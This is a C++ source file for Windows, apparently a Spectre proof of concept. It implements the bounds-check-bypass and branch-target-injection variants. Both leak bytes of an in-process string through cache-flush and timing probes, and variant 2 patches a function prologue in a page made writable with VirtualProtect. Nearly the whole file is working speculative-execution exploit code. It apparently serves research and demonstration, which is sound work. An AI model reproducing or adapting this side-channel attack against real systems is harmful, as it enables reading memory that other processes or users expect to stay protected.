#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <cstdint>
#include <windows.h>

extern "C" {
  uint64_t memory_access(void *target);
  void branch_predictor(uint64_t relative_target,
                        void *basepos,
                        uint64_t *comparer,
                        void *probe_start);
  void indirect_call(const void *proc,
                     const void *target_memory,
                     const void *probe_start);
  void touch_and_break(uint8_t *target_memory, uint8_t *probe_start);
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
constexpr int probe_lines = 256;
uint64_t tat[probe_lines];
uint8_t probe[probe_lines * 4096];

void bounds_check_bypass(const void *target_address) {
  uint64_t comparer = 1;
  uint8_t gateway[] = {0};

  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < probe_lines; i++)
      _mm_clflush(&probe[i * 4096]);

    uint64_t train_and_attack[12] = {};
    train_and_attack[5]
      = train_and_attack[11]
      = reinterpret_cast<uint64_t>(target_address) - reinterpret_cast<uint64_t>(gateway);

    for (auto x : train_and_attack) {
      _mm_clflush(&comparer);
      branch_predictor(x, gateway, &comparer, probe);
    }

    for (int i = 0; i < probe_lines; i++)
      tat[i] = memory_access(&probe[i * 4096]);

    int idx_min = 1;
    for (int i = 1; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

void do_nothing(uint8_t*, uint8_t*) {}

void branch_target_injection(const void *target_address) {
  uint8_t train_and_attack[6] = {};
  train_and_attack[5] = 1;

  uint8_t original_prologue = *reinterpret_cast<uint8_t*>(touch_and_break);
  void (*target_proc)(uint8_t*, uint8_t*) = nullptr;
  void *call_destination = reinterpret_cast<void*>(&target_proc);

  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < probe_lines; i++)
      _mm_clflush(&probe[i * 4096]);

    for (auto x : train_and_attack) {
      *reinterpret_cast<uint8_t*>(touch_and_break) = x ? original_prologue : 0xC3;
      target_proc = x ? do_nothing : touch_and_break;
      indirect_call(call_destination, target_address, probe);
    }

    for (int i = 0; i < probe_lines; i++)
      tat[i] = memory_access(&probe[i * 4096]);

    int idx_min = 1;
    for (int i = 1; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

bool JailbreakMemoryPage(LPVOID target) {
  DWORD old;
  return !!VirtualProtect(reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(target) & ~0xfff),
                          0x1000,
                          PAGE_EXECUTE_WRITECOPY,
                          &old);
}

int main(int argc, const char **argv) {
  if (argc < 2) {
    printf("USAGE: spectre [--variant1 | --variant2]\n\n");
    return 1;
  }
  else {
    int offset = argc >= 3 ? atoi(argv[2]) : 0;
    if (strcmp(argv[1], "--variant1") == 0) {
      bounds_check_bypass(TheAnswer + offset);
    }
    else if (strcmp(argv[1], "--variant2") == 0) {
      if (JailbreakMemoryPage(touch_and_break)) {
        branch_target_injection(TheAnswer + offset);
      }
    }
    else {
      printf("Invalid argument.\n");
      return 1;
    }
  }
  return 0;
}
